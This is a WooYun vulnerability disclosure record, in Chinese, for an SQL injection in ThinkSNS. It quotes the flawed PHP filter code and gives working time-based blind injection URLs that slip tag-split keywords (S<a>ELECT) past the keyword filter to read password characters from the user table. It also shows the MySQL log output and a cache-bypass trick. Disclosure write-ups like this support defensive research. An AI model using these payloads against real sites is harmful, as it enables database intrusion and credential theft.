{"id": 48504, "wybug_id": "wooyun-2014-077877", "wybug_title": "ThinkSNS某处SQL注入漏洞(bypass防注入)", "wybug_corp": "ThinkSNS", "wybug_author": "error", "wybug_date": "2014-09-30 01:35", "wybug_open_date": "2014-12-26 01:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "注射漏洞利用技巧", "防注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向公众公开  简要描述： ThinkSNS某处存在SQL注入漏洞，并可绕过防注入，获取任意数据 详细说明：  漏洞代码：\\apps\\public\\Lib\\Action\\TestAction.class.php540行处的源码：\tpublic function updateCategorySort()\t{\t\t$stable = t($_GET['t']);\t\t\t!empty($stable) && model('CategoryTree')->setTable($stable)->updateSort();\t}\n\n代码中$stable函数代表的是表名，$stable直接使用GET方式传入：$stable = t($_GET['t']); 显然如果t函数处理不当，必然会造成SQL注入漏洞。1)先看t函数的处理逻辑：（\\core\\OpenSociax\\functions.inc.php    630行）/** * t函数用于过滤标签，输出没有html的干净的文本 * @param string text 文本内容 * @return string 处理后内容 */function t($text){    $text = nl2br($text);    $text = real_strip_tags($text);    $text = addslashes($text);    $text = trim($text);    return $text;}t函数实现中在addslashes处理前还会先调用real_strip_tags函数进行处理2)看下real_strip_tags函数的实现：（\\core\\OpenSociax\\functions.inc.php   2274行）function real_strip_tags($str, $allowable_tags=\"\") {    $str = html_entity_decode($str,ENT_QUOTES,'UTF-8');    return strip_tags($str, $allowable_tags);}real_strip_tags函数实现的功能是过滤掉html标签，因此t函数的实现存在绕过防注入的缺陷，比如注入时可以将s<a>elect传入t函数，在经过real_strip_tags函数后s<a>elect就会被转化为select，进而绕过SQL注入的关键字正则匹配检测。因此可以构造如下Payload进行盲注：/index.php?app=public&mod=Test&act=updateCategorySort&t=user/**/W<a>HERE/**/IF((S<a>ELECT/**/A<a>SCII(S<a>UBSTRING(PASSWORD,1,1))F<a>ROM/**/ts_user/**/L<a>IMIT/**/1)=101,S<a>LEEP(2.02),0)%23如果ASCII(SUBSTRING(PASSWORD,1,1)) = 103即字符e ，那么就会执行sleep(2.02),每次执行后需要更改sleep的时间，不然会有缓存，导致不会有sleep的效果，这里可以使用sleep(2.03)、sleep(2.04)这种递增小数位的办法来绕过缓存。   漏洞证明：  利用证明：（本地测试）http://127.0.0.1/thinksns-V3.1/index.php?app=public&mod=Test&act=updateCategorySort&t=user/**/W<a>HERE/**/IF((S<a>ELECT/**/A<a>SCII(S<a>UBSTRING(PASSWORD,1,1))F<a>ROM/**/ts_user/**/L<a>IMIT 1)=101,1=S<a>LEEP(2.02),0)%23\n\nMysql日志输出如下：\n\n15 Query\tSHOW COLUMNS FROM ts_user/**/where/**/if((select/**/ascii(substring(password,1,1))from/**/ts_user/**/limit 1)=101,sleep(2.02),0)#成功绕过防注入进行时间延迟盲注。。   修复方案：  加强过滤逻辑   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-26 01:36 厂商回复：  最新状态： 2014-10-05：来晚，抱歉！  ", "replys": "漏洞评价：\n评论\n     2014-10-18 15:24 |    \t\terror \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:96        )\t\t \n  厂商回复：来晚，抱歉 :) 国庆节漏洞时间不是冻结了吗?    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}